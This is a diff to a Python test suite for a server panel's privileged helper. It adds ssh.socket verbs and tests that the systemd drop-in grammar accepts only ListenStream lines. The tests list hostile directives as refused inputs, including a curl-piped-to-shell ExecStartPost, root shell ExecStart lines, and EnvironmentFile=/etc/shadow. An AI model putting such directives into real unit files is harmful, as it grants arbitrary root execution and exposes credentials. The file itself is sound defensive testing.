@@ -919,6 +919,11 @@ _VERB_SAMPLES = {
     "sysctl-reload": ["tailscale"],
     "sshd-backup-dropin": [],
     "sshd-restore-dropin": [],
+    "sshd-socket-backup": [],
+    "sshd-socket-restore": [],
+    "sshd-socket-discard": [],
+    "sshd-socket-active": [],
+    "systemd-daemon-reload": [],
     "sshd-discard-backup": [],
     "sshd-validate": [],
     "listening-sockets": [],
@@ -2674,3 +2679,37 @@ check("helper: ...and that is a strict subset of ACTIONS (most verbs want no std
 check("helper: ...and the derivation actually read the verb table",
       len(_helper.ACTIONS) >= 20 and "write-file" in _h_consumers,
       "%d actions" % len(_helper.ACTIONS))
+
+
+# ── the ssh.socket drop-in's content grammar ───────────────────────────────────────────────────
+# Every other WRITE_TARGETS destination is a config file whose directives only CONFIGURE. A systemd
+# unit file is not: ExecStartPre= runs a command as root the moment the unit starts, and this unit
+# is restarted by the very verb that writes the file. So an unconstrained write here would be
+# arbitrary root execution reachable from the panel — a strictly worse primitive than the sshd_config
+# drop-in whose grammar this sits beside.
+_sock_rule = _helper.WRITE_CONTENT["sshd-socket-dropin"]
+check("ssh.socket: the drop-in has a content rule at all (no rule = the write is refused anyway)",
+      _sock_rule is not None)
+check("ssh.socket: the body the panel actually sends is accepted",
+      _helper._lines_match("[Socket]\nListenStream=\n"
+                           "ListenStream=0.0.0.0:2222\nListenStream=[::]:2222\n", _sock_rule))
+check("ssh.socket: ...including a bind address and an IPv6 literal",
+      _helper._lines_match("[Socket]\nListenStream=\nListenStream=10.0.0.5:22\n", _sock_rule)
+      and _helper._lines_match("[Socket]\nListenStream=\nListenStream=[fd00::1]:22\n", _sock_rule))
+# Each of these is root execution, a privilege change, or a way to pull in another file.
+for _evil in ("ExecStartPre=/bin/sh -c id",
+              "ExecStartPost=-/bin/sh -c 'curl x|sh'",
+              "ExecStart=/bin/sh",
+              "User=root",
+              "EnvironmentFile=/etc/shadow",
+              "Also=evil.service",
+              "ListenStream=/run/evil.sock",
+              "Accept=yes",
+              "[Service]",
+              "ListenStream=0.0.0.0:22\nExecStartPre=/bin/sh"):
+    check("ssh.socket: grammar refuses %r" % _evil.replace("\n", " ⏎ ")[:44],
+          not _helper._lines_match(_evil, _sock_rule))
+# A comment and a blank line are skipped by _lines_match, so the panel's own header must not be a
+# way past the grammar: a directive is a directive whether or not comments surround it.
+check("ssh.socket: ...and a comment header does not smuggle a directive past it",
+      not _helper._lines_match("# Managed by LinuxGSM Panel\n\nExecStart=/bin/sh\n", _sock_rule))
